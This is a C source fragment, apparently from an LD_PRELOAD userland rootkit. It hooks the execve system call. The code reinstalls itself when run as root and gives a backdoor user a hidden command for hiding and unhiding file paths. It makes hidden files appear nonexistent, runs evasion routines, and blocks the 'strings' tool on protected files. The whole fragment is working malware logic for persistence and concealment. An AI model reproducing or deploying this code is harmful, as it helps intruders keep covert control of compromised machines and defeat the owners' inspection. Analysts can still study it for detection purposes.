int execve(const char *filename, char *const argv[], char *const envp[]){
#ifdef DO_REINSTALL
    if(!not_user(0)) reinstall();
#endif

    /* resolve all of the symbols that we may need to use */
    hook(CEXECVE,
         CACCESS);

    if(is_bdusr()){
#ifdef HIDE_SELF
        if(!fnmatch(EUTILS, argv[0], FNM_PATHNAME)){
            if(argv[1] == NULL){    /* we need an option */
                printf(ERR_NO_OPTION);
                exit(-1);
            }

            /* if we have argv[3], it should be a path, verify it exists */
            if(argv[3] != NULL){
                if((long)call(CACCESS, argv[3], F_OK) < 0 && errno == ENOENT){
                    printf(ERR_STAT_PATH);
                    exit(-1);   /* exit with -1 if we can't stat the path */
                }
            }

            if(!argv[2]) exit(-1);

            /* hide or unhide given path */
            if(!strncmp(S_HIDE_PATH, argv[1], strlen(S_HIDE_PATH))){
                switch(hide_path(argv[2])){
                    case PATH_DONE:
                        printf(ALRDY_HIDDEN_STR);
                        break;
                    case PATH_SUCC:
                        printf(PATH_HIDDEN_STR);
                        break;
                    case PATH_ERR:
                        printf(ERR_HIDING_PATH);
                        break;
                }
            }else if(!strncmp(S_UNHIDE_PATH, argv[1], strlen(S_UNHIDE_PATH))){
                switch(unhide_path(argv[2])){
                    case PATH_DONE:
                        printf(ALRDY_VISIBLE_STR);
                        break;
                    case PATH_SUCC:
                        printf(PATH_VISIBLE_STR);
                        break;
                    case PATH_ERR:
                        printf(ERR_UNHIDING_PATH);
                        break;
                }
            }
            exit(0);
        }
#endif

        return (long)call(CEXECVE, filename, argv, envp);
    }

    if(hidden_path(filename)){
        errno = ENOENT;
        return -1;
    }

#if defined(DO_REINSTALL) && defined(DO_EVASIONS)
    int evasion_status = evade(filename, argv, envp);
    switch(evasion_status){
        case VEVADE_DONE:
            exit(0);
        case VINVALID_PERM:
            errno = CANTEVADE_ERR;
            return -1;
        case VFORK_ERR:
            return -1;
        case VFORK_SUC:
            return (long)call(CEXECVE, filename, argv, envp);
        case VNOTHING_DONE:
            break;  /* ?? */
    }
#endif

#ifdef BLOCK_STRINGS
    /* block users from calling 'strings' on certain files */
    if(block_strings(argv)){
        errno = EPERM;
        return -1;
    }
#endif

    return (long)call(CEXECVE, filename, argv, envp);
}
